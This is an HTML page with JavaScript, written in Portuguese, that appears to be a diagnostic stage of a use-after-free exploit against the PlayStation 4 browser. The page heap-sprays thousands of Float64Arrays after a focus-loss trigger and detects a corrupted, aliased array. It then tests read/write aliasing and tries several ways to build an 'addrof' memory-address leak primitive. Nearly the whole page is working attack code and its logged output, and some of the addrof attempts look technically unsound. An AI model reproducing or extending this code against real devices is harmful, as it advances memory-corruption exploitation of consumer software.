<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Deep Diagnostics</title>
</head>
<body>
    <h1>PS4 UAF - Deep Diagnostics v8.0</h1>
    <h2>Investigando TEST3 e TEST5</h2>
    
    <button onclick="runDeepDiagnostics()">DIAGNOSTICO PROFUNDO</button>
    <br><br>
    <button onclick="clearLog()">LIMPAR</button>
    
    <hr>
    <div id="log"></div>
    
    <script>
        function makeFloat(hi, lo) {
            const b = new ArrayBuffer(8);
            const u = new Uint32Array(b);
            u[0] = lo;
            u[1] = hi;
            return new Float64Array(b)[0];
        }
        
        function f2h(f) {
            const b = new ArrayBuffer(8);
            new Float64Array(b)[0] = f;
            const u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        const P_A = 2.121995791e-314;
        const M_V = makeFloat(0xDEADBEEF, 0xCAFEBABE);
        const W_V = makeFloat(0x13371337, 0x13371337);
        const TEST_PATTERN = makeFloat(0xBEEFBEEF, 0xBEEFBEEF);
        
        let targetObj = { leak: 0x1337, type: "target" };
        let globalCtrl = null;
        let globalSpray = null;
        let globalCorrupted = null;
        
        function log(msg, color) {
            const d = document.getElementById('log');
            const t = new Date().toLocaleTimeString();
            d.innerHTML += '<div style="color:' + (color || 'black') + '">[' + t + '] ' + msg + '</div>';
            d.scrollTop = d.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        function runDeepDiagnostics() {
            clearLog();
            log('==========================================', 'blue');
            log('PS4 UAF - DIAGNOSTICO PROFUNDO v8.0', 'blue');
            log('==========================================', 'blue');
            log('', '');
            
            log('[INFO] Padroes de teste:', 'cyan');
            log('  P_A (spray): ' + f2h(P_A), 'cyan');
            log('  M_V (write): ' + f2h(M_V), 'cyan');
            log('  W_V (reverse): ' + f2h(W_V), 'cyan');
            log('  TEST_PATTERN: ' + f2h(TEST_PATTERN), 'cyan');
            log('', '');
            
            log('[INIT] Criando 5000 controllers...', 'blue');
            globalCtrl = [];
            for(let i = 0; i < 5000; i++) {
                const a = new Float64Array(8);
                a[0] = i;
                globalCtrl.push(a);
            }
            
            log('[INIT] Controllers criados', 'green');
            log('[WAIT] APERTE OPTIONS!', 'red');
            log('', '');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                // Spray atomico
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    const s = new Float64Array(8);
                    s.fill(P_A);
                    globalSpray.push(s);
                }
                
                log('[SPRAY] 8000 arrays criados', 'green');
                log('[SPRAY] Verificando spray[0]:', 'cyan');
                for(let i = 0; i < 8; i++) {
                    log('  spray[0][' + i + '] = ' + f2h(globalSpray[0][i]), 'cyan');
                }
                log('', '');
                
                // Busca
                globalCorrupted = null;
                let idx = -1;
                
                for(let i = 0; i < globalCtrl.length; i++) {
                    if(globalCtrl[i][0] === P_A) {
                        globalCorrupted = globalCtrl[i];
                        idx = i;
                        break;
                    }
                }
                
                if(!globalCorrupted) {
                    log('[UAF] NAO DETECTADO', 'red');
                    return;
                }
                
                log('[UAF] DETECTADO! Index: ' + idx, 'green');
                log('', '');
                
                log('==========================================', 'purple');
                log('INVESTIGACAO: TEST3 (Identity)', 'purple');
                log('==========================================', 'purple');
                log('', '');
                
                log('[STEP1] Estado inicial do corrupted:', 'blue');
                for(let i = 0; i < 8; i++) {
                    log('  corrupted[' + i + '] = ' + f2h(globalCorrupted[i]), 'cyan');
                }
                log('', '');
                
                log('[STEP2] Escrevendo M_V em corrupted[4]...', 'blue');
                globalCorrupted[4] = M_V;
                log('  Confirmacao: corrupted[4] = ' + f2h(globalCorrupted[4]), 'cyan');
                log('  Esperado: ' + f2h(M_V), 'cyan');
                
                if(f2h(globalCorrupted[4]) === f2h(M_V)) {
                    log('  Status: Escrita OK', 'green');
                } else {
                    log('  Status: Escrita FALHOU!', 'red');
                }
                log('', '');
                
                log('[STEP3] Procurando M_V no spray...', 'blue');
                let foundCount = 0;
                let firstMatch = -1;
                
                for(let i = 0; i < globalSpray.length; i++) {
                    if(globalSpray[i][4] === M_V) {
                        foundCount++;
                        if(firstMatch === -1) firstMatch = i;
                    }
                }
                
                log('  Total de matches: ' + foundCount, 'cyan');
                if(foundCount > 0) {
                    log('  Primeiro match em: spray[' + firstMatch + ']', 'cyan');
                    log('  Verificando spray[' + firstMatch + ']:', 'cyan');
                    for(let i = 0; i < 8; i++) {
                        log('    [' + i + '] = ' + f2h(globalSpray[firstMatch][i]), 'cyan');
                    }
                } else {
                    log('  M_V NAO encontrado no spray!', 'red');
                    log('', '');
                    log('[DEBUG] Amostra de 5 arrays do spray:', 'orange');
                    for(let i = 0; i < 5; i++) {
                        log('  spray[' + i + '][4] = ' + f2h(globalSpray[i][4]), 'orange');
                    }
                }
                log('', '');
                
                log('[STEP4] Teste alternativo: Escrever DIRETAMENTE no spray', 'blue');
                log('  Escrevendo TEST_PATTERN em spray[0][3]...', 'cyan');
                globalSpray[0][3] = TEST_PATTERN;
                log('  Verificando corrupted[3]:', 'cyan');
                log('  corrupted[3] = ' + f2h(globalCorrupted[3]), 'cyan');
                log('  Esperado: ' + f2h(TEST_PATTERN), 'cyan');
                
                if(f2h(globalCorrupted[3]) === f2h(TEST_PATTERN)) {
                    log('  EUREKA! Spray -> Corrupted funciona!', 'green');
                } else {
                    log('  Spray -> Corrupted NAO funciona', 'red');
                }
                log('', '');
                
                log('==========================================', 'purple');
                log('INVESTIGACAO: TEST5 (addrof)', 'purple');
                log('==========================================', 'purple');
                log('', '');
                
                log('[METHOD1] Array.from() + assignment', 'blue');
                try {
                    const beforeSlot7 = f2h(globalCorrupted[7]);
                    log('  Slot 7 antes: ' + beforeSlot7, 'cyan');
                    
                    let leaker = Array.from(globalCorrupted);
                    leaker[7] = targetObj;
                    
                    const afterSlot7 = f2h(globalCorrupted[7]);
                    log('  Slot 7 depois: ' + afterSlot7, 'cyan');
                    
                    if(afterSlot7 !== beforeSlot7 && afterSlot7 !== '0x0000000000000000') {
                        log('[METHOD1] SUCESSO! Endereco: ' + afterSlot7, 'green');
                    } else {
                        log('[METHOD1] FALHOU - Sem mudanca', 'red');
                    }
                } catch(e) {
                    log('[METHOD1] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                log('[METHOD2] Atribuicao direta', 'blue');
                try {
                    const beforeSlot6 = f2h(globalCorrupted[6]);
                    log('  Slot 6 antes: ' + beforeSlot6, 'cyan');
                    
                    globalCorrupted[6] = targetObj;
                    
                    const afterSlot6 = f2h(globalCorrupted[6]);
                    log('  Slot 6 depois: ' + afterSlot6, 'cyan');
                    
                    if(afterSlot6 !== beforeSlot6 && afterSlot6 !== '0x0000000000000000') {
                        log('[METHOD2] SUCESSO! Endereco: ' + afterSlot6, 'green');
                    } else {
                        log('[METHOD2] FALHOU', 'red');
                    }
                } catch(e) {
                    log('[METHOD2] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                log('[METHOD3] Via array wrapper', 'blue');
                try {
                    const beforeSlot5 = f2h(globalCorrupted[5]);
                    log('  Slot 5 antes: ' + beforeSlot5, 'cyan');
                    
                    let wrapper = [targetObj];
                    let temp = new Float64Array(1);
                    temp[0] = wrapper[0];
                    globalCorrupted[5] = temp[0];
                    
                    const afterSlot5 = f2h(globalCorrupted[5]);
                    log('  Slot 5 depois: ' + afterSlot5, 'cyan');
                    
                    if(afterSlot5 !== beforeSlot5 && afterSlot5 !== '0x0000000000000000') {
                        log('[METHOD3] SUCESSO! Endereco: ' + afterSlot5, 'green');
                    } else {
                        log('[METHOD3] FALHOU', 'red');
                    }
                } catch(e) {
                    log('[METHOD3] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                log('[METHOD4] Via DataView', 'blue');
                try {
                    const beforeSlot2 = f2h(globalCorrupted[2]);
                    log('  Slot 2 antes: ' + beforeSlot2, 'cyan');
                    
                    // Tenta colocar objeto e ler raw bytes
                    let container = [targetObj];
                    let containerArray = new Float64Array(1);
                    
                    // Truque: forÃ§a cast
                    containerArray[0] = container[0];
                    
                    const rawBytes = f2h(containerArray[0]);
                    log('  Raw bytes do objeto: ' + rawBytes, 'cyan');
                    
                    if(rawBytes !== '0x0000000000000000') {
                        log('[METHOD4] Objeto tem representacao: ' + rawBytes, 'green');
                    } else {
                        log('[METHOD4] Objeto vira zero', 'orange');
                    }
                } catch(e) {
                    log('[METHOD4] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                log('==========================================', 'green');
                log('DIAGNOSTICO COMPLETO', 'green');
                log('==========================================', 'green');
                log('', '');
                log('Proximos passos baseados nos resultados:', 'cyan');
                log('1. Se STEP4 passou: spray->corrupted funciona (teste reverso)', 'cyan');
                log('2. Se algum METHOD passou: use esse para addrof', 'cyan');
                log('3. Se tudo falhou: documentar limitacoes', 'cyan');
                log('', '');
                
                // Export
                window.uafDiagnostics = {
                    corrupted: globalCorrupted,
                    spray: globalSpray,
                    index: idx,
                    
                    testReverse: function() {
                        log('', '');
                        log('[TESTE MANUAL] Escrevendo em spray[0][1]...', 'blue');
                        globalSpray[0][1] = W_V;
                        log('  corrupted[1] = ' + f2h(globalCorrupted[1]), 'cyan');
                        log('  Esperado: ' + f2h(W_V), 'cyan');
                        if(f2h(globalCorrupted[1]) === f2h(W_V)) {
                            log('  FUNCIONA!', 'green');
                        } else {
                            log('  NAO funciona', 'red');
                        }
                    }
                };
                
                log('window.uafDiagnostics.testReverse() para teste manual', 'blue');
            };
        }
    </script>
</body>
</html>
